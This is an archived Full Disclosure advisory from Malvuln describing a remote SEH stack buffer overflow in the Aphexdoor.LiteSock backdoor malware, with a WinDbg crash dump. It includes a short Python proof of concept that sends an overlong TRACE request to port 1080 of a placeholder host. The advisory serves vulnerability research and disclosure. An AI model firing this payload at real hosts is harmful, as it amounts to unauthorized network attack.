@@ -1,0 +1,273 @@
+---
+title: Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer	Overflow (SEH)
+url: https://seclists.org/fulldisclosure/2022/Nov/4
+source: Full Disclosure
+date: 2022-11-16
+fetch_date: 2025-10-03T22:55:24.820197
+---
+
+# Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer	Overflow (SEH)
+
+[![](/shared/images/nst-icons.svg#menu)](#menu)
+![](/shared/images/nst-icons.svg#close)
+[![Home page logo](/images/sitelogo.png)](/)
+
+[Nmap.org](https://nmap.org/)
+[Npcap.com](https://npcap.com/)
+[Seclists.org](https://seclists.org/)
+[Sectools.org](https://sectools.org)
+[Insecure.org](https://insecure.org/)
+
+![](/shared/images/nst-icons.svg#search)
+
+[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
+
+## [Full Disclosure](/fulldisclosure/) mailing list archives
+
+[![Previous](/images/left-icon-16x16.png)](3)
+[By Date](date.html#4)
+[![Next](/images/right-icon-16x16.png)](5)
+
+[![Previous](/images/left-icon-16x16.png)](3)
+[By Thread](index.html#4)
+[![Next](/images/right-icon-16x16.png)](5)
+
+![](/shared/images/nst-icons.svg#search)
+
+# Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer Overflow (SEH)
+
+---
+
+*From*: malvuln <malvuln13 () gmail com>
+*Date*: Wed, 9 Nov 2022 20:49:36 -0500
+
+---
+
+```
+Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
+Original source:
+https://malvuln.com/advisory/2047ac6183da4dfb61d2562721ba0720.txt
+Contact: malvuln13 () gmail com
+Media: twitter.com/malvuln
+
+Threat: Backdoor.Win32.Aphexdoor.LiteSock
+Vulnerability: Remote Stack Buffer Overflow (SEH)
+Description: The malware drops an extensionless PE file named "3" which
+listens on TCP port 1080. Third-party attackers who can reach an infected
+host can send a specially crafted packet to port 1080, that will trigger a
+stack buffer overflow overwriting ECX register and SEH.
+Family: Aphexdoor
+Type: PE32
+MD5: 2047ac6183da4dfb61d2562721ba0720
+Vuln ID: MVID-2022-0653
+Dropped files: "3"
+ASLR: False
+DEP: False
+CFG: False
+Safe SEH: False
+Disclosure: 11/09/2022
+
+Memory Dump:
+(135c.27c8): Access violation - code c0000005 (first/second chance not
+available)
+eax=00000000 ebx=00000000 ecx=41414141 edx=77729d70 esi=02651848
+edi=02651d0c
+eip=7770e916 esp=02651790 ebp=02651830 iopl=0         nv up ei pl nz ac pe
+nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00000216
+ntdll!ZwQueryInformationProcess+0x26:
+7770e916 c21400          ret     14h
+
+0:004> .ecxr
+eax=00000000 ebx=00000000 ecx=41414141 edx=77729d70 esi=02651848
+edi=02651d0c
+eip=7770e916 esp=02651790 ebp=02651830 iopl=0         nv up ei pl nz ac pe
+nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00000216
+ntdll!ZwQueryInformationProcess+0x26:
+7770e916 c21400          ret     14h
+
+0:004> !analyze -v
+*******************************************************************************
+*
+  *
+*                        Exception Analysis
+  *
+*
+  *
+*******************************************************************************
+
+*** WARNING: Unable to verify checksum for 3
+*** ERROR: Module load completed but symbols could not be loaded for 3
+Failed calling InternetOpenUrl, GLE=12029
+
+FAULTING_IP:
++26
+312e312f ??              ???
+
+EXCEPTION_RECORD:  0274fadc -- (.exr 0x274fadc)
+ExceptionAddress: 312e312f
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000000
+   Parameter[1]: 312e312f
+Attempt to read from address 312e312f
+
+PROCESS_NAME:  3
+
+ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced
+memory at 0x%p. The memory could not be %s.
+
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced
+memory at 0x%p. The memory could not be %s.
+
+EXCEPTION_PARAMETER1:  00000001
+
+EXCEPTION_PARAMETER2:  02650fe8
+
+WRITE_ADDRESS:  02650fe8
+
+FOLLOWUP_IP:
++26
+51bb743d e89efdffff      call    51bb71e0
+
+FAILED_INSTRUCTION_ADDRESS:
++26
+41414141 ??              ???
+
+MOD_LIST: <ANALYSIS/>
+
+NTGLOBALFLAG:  0
+
+APPLICATION_VERIFIER_FLAGS:  0
+
+CONTEXT:  0274fb2c -- (.cxr 0x274fb2c)
+eax=00000001 ebx=00000234 ecx=72b87bf5 edx=00000001 esi=004011a8
+edi=004011a8
+eip=312e312f esp=0274ff8c ebp=50545448 iopl=0         nv up ei pl nz na po
+nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
+efl=00010202
+312e312f ??              ???
+Resetting default scope
+
+ADDITIONAL_DEBUG_TEXT:  Followup set based on attribute
+[Is_ChosenCrashFollowupThread] from Frame:[0] on thread:[PSEUDO_THREAD]
+
+LAST_CONTROL_TRANSFER:  from 203a7473 to 312e312f
+
+FAULTING_THREAD:  ffffffff
+
+DEFAULT_BUCKET_ID:  STACKIMMUNE
+
+PRIMARY_PROBLEM_CLASS:  STACKIMMUNE
+
+BUGCHECK_STR:
+
+APPLICATION_FAULT_STACKIMMUNE_STACK_OVERFLOW_BAD_INSTRUCTION_PTR_INVALID_POINTER_WRITE_EXPLOITABLE_FILL_PATTERN_41414141
+
+IP_ON_HEAP:  203a7473
+The fault address in not in any loaded module, please check your build's
+rebase
+log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which
+may
+contain the address if it were loaded.
+
+IP_IN_FREE_BLOCK: 203a7473
+
+FRAME_ONE_INVALID: 1
+
+STACK_TEXT:
+00000000 00000000 3+0x0
+
+STACK_COMMAND:  .cxr 000000000274FB2C ; kb ; ** Pseudo Context ** ; kb
+
+SYMBOL_NAME:  3
+
+FOLLOWUP_NAME:  MachineOwner
+
+MODULE_NAME: 3
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  21475346
+
+FAILURE_BUCKET_ID:  STACKIMMUNE_c0000005_3!Unknown
+
+BUCKET_ID:
+
+APPLICATION_FAULT_STACKIMMUNE_STACK_OVERFLOW_BAD_INSTRUCTION_PTR_INVALID_POINTER_WRITE_EXPLOITABLE_FILL_PATTERN_41414141_BAD_IP_3
+
+0:004> !exchain
+0265175c: ntdll!ExecuteHandler2+44 (77729d70)
+0274ffcc: 41414141
+Invalid exception stack at 41414141
+
+Exploit/PoC:
+from socket import *
+
+MALWARE_HOST="x.x.x.x"
+PORT=1080
+
+s=socket(AF_INET, SOCK_STREAM)
+s.connect((MALWARE_HOST, PORT))
+
+PAYLOAD="TRACE /"+"A"*72+" HTTP/1.1\r\nHost:
+"+MALWARE_HOST+"\r\n\X-Request-ID: "+"A"*72
+
+s.send(PAYLOAD.encode())
+s.close()
+print("Aphexdoor.LiteSock Buffer Overflow by Malvuln")
+
+Disclaimer: The information contained within this advisory is supplied
+"as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author. The author is not responsible for any misuse of the information
+contained herein and accepts no responsibility for any damage caused by the
+use or misuse of this information. The author prohibits any malicious use
+of security related information or exploits by the author or elsewhere. Do
+not attempt to download Malware samples. The author of this website takes
+no responsibility for any kind of damages occurring from improper Malware
+handling or the downloading of ANY Malware mentioned on this website or
+elsewhere. All content Copyright (c) Malvuln.com (TM).
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
+```
+
+---
+
+[![Previous](/images/left-icon-16x16.png)](3)
+[By Date](date.html#4)
+[![Next](/images/right-icon-16x16.png)](5)
+
+[![Previous](/images/left-icon-16x16.png)](3)
+[By Thread](index.html#4)
+[![Next](/images/right-icon-16x16.png)](5)
+
+### Current thread:
+
+* **Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer Overflow (SEH)** *malvuln (Nov 15)*
+
+![](/shared/images/nst-icons.svg#search)
+
+## [Nmap Security Scanner](https://nmap.org/)
+
+* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)
+
+## [Npcap packet capture](https://npcap.com/)
+
+* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)
+
+## [Security Lists](https://seclists.org/)
+
+* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)
+
+## [Security Tools](https://sectools.org)
+
+* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audi...
